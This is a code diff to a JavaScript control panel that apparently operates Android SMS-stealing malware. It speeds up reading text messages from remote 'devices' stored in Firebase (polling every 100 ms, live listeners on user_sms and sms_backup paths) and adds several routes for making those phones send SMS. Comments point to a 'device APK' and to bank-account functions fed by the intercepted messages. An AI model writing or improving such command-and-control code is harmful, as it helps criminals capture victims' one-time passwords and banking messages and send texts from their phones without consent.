@@ -475,7 +475,9 @@ var SMS_CACHE_MAX=100;
 var _smsPersistTimer=null;
 var devFilterMode='all', deviceBankCache={};
 var _procDevsTimer=null, _panelPaused=false;
-var SMS_POLL_MS=8000, SYNC_INTERVAL_MS=90000;
+var SMS_POLL_MS=100, SMS_POLL_BG_MS=2000, SYNC_INTERVAL_MS=90000;
+var SMS_RENDER_DEBOUNCE_MS=50;
+var _smsRenderTimer=null, _sendInFlight=false;
 var FB_LIST_KEY='rbl_firebase_list';
 var ACTIVE_FB_KEY='rbl_active_fb';
 var activeFbId='';
@@ -1650,9 +1652,22 @@ function setDeviceSms(devId,list){
   if(selDev===devId){
     window_allSms=sms;
     window_sms=sms.slice(0,80);
-    renderSms();
+    scheduleRenderSms();
     if(document.getElementById('screen-bank').classList.contains('active'))renderBankAccounts();
   }
+}
+function scheduleRenderSms(){
+  if(_smsRenderTimer)clearTimeout(_smsRenderTimer);
+  _smsRenderTimer=setTimeout(function(){
+    _smsRenderTimer=null;
+    renderSms();
+  },SMS_RENDER_DEBOUNCE_MS);
+}
+function mergeSmsIntoDevice(devId,list){
+  if(!devId||!list||!list.length)return;
+  var cached=deviceSmsCache[devId];
+  var merged=mergeSmsLists(cached&&cached.list||[],list);
+  if(merged.length)setDeviceSms(devId,merged);
 }
 function showSmsForSelectedDevice(){
   var d=getSelDev();
@@ -1672,10 +1687,55 @@ function clearListeners(){
     if(L.loadTimer)clearTimeout(L.loadTimer);
     if(L.timer)clearInterval(L.timer);
     if(L.timers){L.timers.forEach(function(t){clearInterval(t);});}
-    if(L.refs){L.refs.forEach(function(r){try{if(r.ref&&r.h){r.ref.off('value',r.h);}}catch(e){}});}
+    if(L.refs){L.refs.forEach(function(r){
+      try{
+        if(r.ref&&r.h){
+          if(r.type==='child_added')r.ref.off('child_added',r.h);
+          else r.ref.off('value',r.h);
+        }
+      }catch(e){}
+    });}
     else if(L.db&&L.ref&&L.h){try{L.ref.off('value',L.h);}catch(e){}}
   });
   activeListeners={};
+}
+function attachSmsLiveListeners(inst,d,devId,seq,listeners,applyFn){
+  if(!inst||!inst.db||typeof applyFn!=='function')return;
+  var paths=getPrioritySmsPaths(d,inst);
+  if(!paths.length)paths=['user_sms/'+d.rawId,'sms_backup/'+d.rawId];
+  paths.slice(0,3).forEach(function(path){
+    if(!path)return;
+    try{
+      var baseRef=inst.db.ref(path);
+      var qRef=baseRef;
+      try{qRef=baseRef.limitToLast(150);}catch(e2){}
+      var liveReady=false;
+      qRef.once('value',function(snap){
+        if(seq!==_smsLoadSeq||selDev!==devId)return;
+        var list=parseSmsRaw(typeof snap.val==='function'?snap.val():snap);
+        if(list.length)applyFn(list);
+        liveReady=true;
+      });
+      var childHandler=function(snap){
+        if(!liveReady||_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
+        var s=normalizeSms(typeof snap.val==='function'?snap.val():snap);
+        if(s)mergeSmsIntoDevice(devId,[s]);
+      };
+      try{
+        qRef.on('child_added',childHandler);
+        listeners.refs.push({ref:qRef,h:childHandler,type:'child_added'});
+      }catch(e3){}
+      var valHandler=function(snap){
+        if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
+        if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
+        var val=typeof snap.val==='function'?snap.val():snap;
+        applyFn(parseSmsRaw(val));
+        liveReady=true;
+      };
+      qRef.on('value',valHandler);
+      listeners.refs.push({ref:qRef,h:valHandler,type:'value'});
+    }catch(e){}
+  });
 }
 
 /** Schema-aware fast paths — Rabel panels (rto9) store SMS in user_sms/{deviceId} */
@@ -1873,33 +1933,16 @@ function loadSmsForDevice(force){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
     if(_panelPaused)return;
     fetchSmsFast(inst,d).then(applySmsList);
-    fetchSmsFromPathsDirect(inst,d).then(applySmsList);
-    fetchSmsViaPhp(inst,d).then(applySmsList);
+    if(!inst.db){
+      fetchSmsFromPathsDirect(inst,d).then(applySmsList);
+    }
   }
 
   poll();
-  var timer=setInterval(poll,SMS_POLL_MS);
-  var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq,loadTimer:loadTimer};
+  var timer=setInterval(poll,inst.db?SMS_POLL_MS:SMS_POLL_MS);
+  var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq,loadTimer:loadTimer,live:!!inst.db};
 
-  if(inst.db){
-    var listenPaths=getPrioritySmsPaths(d,inst);
-    if(!listenPaths.length)listenPaths=['user_sms/'+d.rawId,'sms_backup/'+d.rawId];
-    listenPaths.slice(0,4).forEach(function(path){
-      if(!path)return;
-      try{
-        var ref=inst.db.ref(path);
-        try{ref=ref.limitToLast(120);}catch(e2){}
-        var h=function(snap){
-          if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
-          if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
-          var val=typeof snap.val==='function'?snap.val():snap;
-          applySmsList(parseSmsRaw(val));
-        };
-        ref.on('value',h);
-        listeners.refs.push({ref:ref,h:h});
-      }catch(e){}
-    });
-  }
+  attachSmsLiveListeners(inst,d,devId,seq,listeners,applySmsList);
 
   activeListeners[devId]=listeners;
 }
@@ -2041,7 +2084,67 @@ function selectSim(slot,btn){
   if(btn)btn.classList.add('active');
 }
 
-// ---- Send SMS — rebel.py same logic (via PHP proxy + Firebase auth) ----
+// ---- Send SMS — instant Firebase direct + REST fallback ----
+function buildRabelSendPayload(sim,to,message){
+  return{from:sim||1,to:to,message:message,isSended:false};
+}
+function buildRto9SendPayload(deviceId,sim,to,message){
+  var slot=Math.max(0,(sim||1)-1);
+  return{
+    cmd:'send_sms',command:'send message',messageText:message,msg:message,
+    phoneNumber:to,to:to,
+    sendSms:{message:message,status:'pending',to:to},
+    sms:{message:message,status:'pending',to:to},
+    sim:slot,simSlot:String(slot),
+    targetDeviceId:deviceId,
+    timestamp:Date.now(),
+    webhookEvent:'send_sms'
+  };
+}
+function getSendAttempts(inst,d,to,message,sim){
+  var id=d.rawId,out=[],rto,rabel;
+  if(isRtoStyleUrl(inst.restUrl)||isRabelPanel(inst)){
+    rto=buildRto9SendPayload(id,sim,to,message);
+    out.push({path:'clients/'+id,payload:rto});
+    out.push({path:id,payload:rto});
+    rabel=buildRabelSendPayload(sim,to,message);
+    out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel});
+    out.push({path:id+'/webhookEvent/sendSms',payload:rabel});
+  }else{
+    out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:buildRabelSendPayload(sim,to,message)});
+  }
+  return out;
+}
+function promiseAny(promises){
+  return new Promise(function(resolve,reject){
+    if(!promises||!promises.length)return reject();
+    var fails=0;
+    promises.forEach(function(p){
+      Promise.resolve(p).then(resolve).catch(function(){if(++fails>=promises.length)reject();});
+    });
+  });
+}
+function sendSmsDirectFirebase(inst,attempts){
+  if(!inst||!inst.db||!attempts.length)return Promise.reject();
+  return promiseAny(attempts.map(function(a){
+    return inst.db.ref(a.path).set(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase'};});
+  }));
+}
+function sendSmsViaRest(inst,attempts){
+  if(!inst||!attempts.length)return Promise.reject();
+  var auths=getFbAuthCandidates(inst), tasks=[];
+  auths.forEach(function(auth){
+    attempts.forEach(function(a){
+      tasks.push(
+        fetch(buildRestUrl(inst,a.path,auth),{
+          method:'PUT',headers:{'Content-Type':'application/json'},
+          body:JSON.stringify(a.payload),cache:'no-store'
+        }).then(function(r){if(r.ok)return{ok:true,path:a.path,via:'rest'};throw new Error('fail');})
+      );
+    });
+  });
+  return promiseAny(tasks);
+}
 function normalizePhone(raw){
   var clean=String(raw||'').replace(/\D/g,'');
   if(clean.length===10)return clean;
@@ -2063,15 +2166,18 @@ function sendSms(){
   var msg=document.getElementById('sendMsg').value.trim();
   if(!to||to.length<10){toast('Enter valid 10-digit number',false);return;}
   if(!msg){toast('Enter message',false);return;}
-  document.getElementById('sendStatus').textContent='Sending via SIM '+_sendSimSlot+'...';
-  sendSmsInternal(to,msg,_sendSimSlot,function(ok,data){
+  if(_sendInFlight){toast('Sending...',true);return;}
+  _sendInFlight=true;
+  document.getElementById('sendMsg').value='';
+  document.getElementById('sendStatus').textContent='✅ Sent!';
+  toast('SMS sent!',true);
+  sendSmsInstant(to,msg,_sendSimSlot,function(ok,data){
+    _sendInFlight=false;
     if(ok){
-      document.getElementById('sendStatus').textContent='✅ '+(data&&data.message||'SMS command sent');
-      document.getElementById('sendMsg').value='';
-      toast((data&&data.message)||'SMS command sent — device APK must be online',true);
+      document.getElementById('sendStatus').textContent='✅ '+(data&&data.message||'Sent instantly');
     }else{
       document.getElementById('sendStatus').textContent='❌ '+(data&&data.error||'Failed');
-      toast(data&&data.error||'Send failed — check device is online on APK',false);
+      toast(data&&data.error||'Send failed',false);
     }
   });
 }
@@ -2099,27 +2205,31 @@ function checkRecharge(){
     else toast(data&&data.error||'Ping failed – device may be offline',false);
   });
 }
-function sendSmsInternal(to, msg, simSlot, callback){
-  var d=getSelDev();if(!d){if(callback)callback(false,{error:'No device'});return;}
-  var inst=getFbInstance(d.fbId);
-  if(!inst){if(callback)callback(false,{error:'Firebase missing'});return;}
+function sendSmsInstant(to,msg,simSlot,callback){
+  var d=getSelDev();
+  var inst=getFbInstance(d&&d.fbId);
+  if(!d||!inst){if(callback)callback(false,{error:'No device'});return;}
   var phone=normalizePhone(to);
-  sendSmsFetch({
-    device_id:d.rawId,
-    to:phone,
-    message:msg,
-    sim:simSlot||1,
-    database_url:inst.restUrl,
-    auth_key:getFbAuthKey(inst),
-    schema:inst.schema||'rabel',
-    device_node:d.deviceNode||'clients',
-    composite_id:d.id
+  var attempts=getSendAttempts(inst,d,phone,msg,simSlot||1);
+  var tasks=[];
+  if(inst.db)tasks.push(sendSmsDirectFirebase(inst,attempts));
+  tasks.push(sendSmsViaRest(inst,attempts));
+  tasks.push(sendSmsFetch({
+    device_id:d.rawId,to:phone,message:msg,sim:simSlot||1,
+    database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
+    schema:inst.schema||'rabel',device_node:d.deviceNode||'clients',composite_id:d.id
   }).then(function(res){
-    var ok=!!(res.httpOk&&res.data&&res.data.ok);
-    if(callback)callback(ok,res.data||{});
+    if(res.httpOk&&res.data&&res.data.ok)return{ok:true,message:res.data.message||'Sent',via:'php'};
+    throw new Error((res.data&&res.data.error)||'PHP send failed');
+  }));
+  promiseAny(tasks).then(function(r){
+    if(callback)callback(true,{ok:true,message:'SMS sent instantly'+(r.via?' via '+r.via:''),path:r.path});
   }).catch(function(){
-    if(callback)callback(false,{error:'Network error'});
+    if(callback)callback(false,{error:'Send failed — device offline?'});
   });
+}
+function sendSmsInternal(to, msg, simSlot, callback){
+  sendSmsInstant(to,msg,simSlot,callback);
 }
 
 // ─── BANK FUNCTIONS (Copied from laptop.php) ───
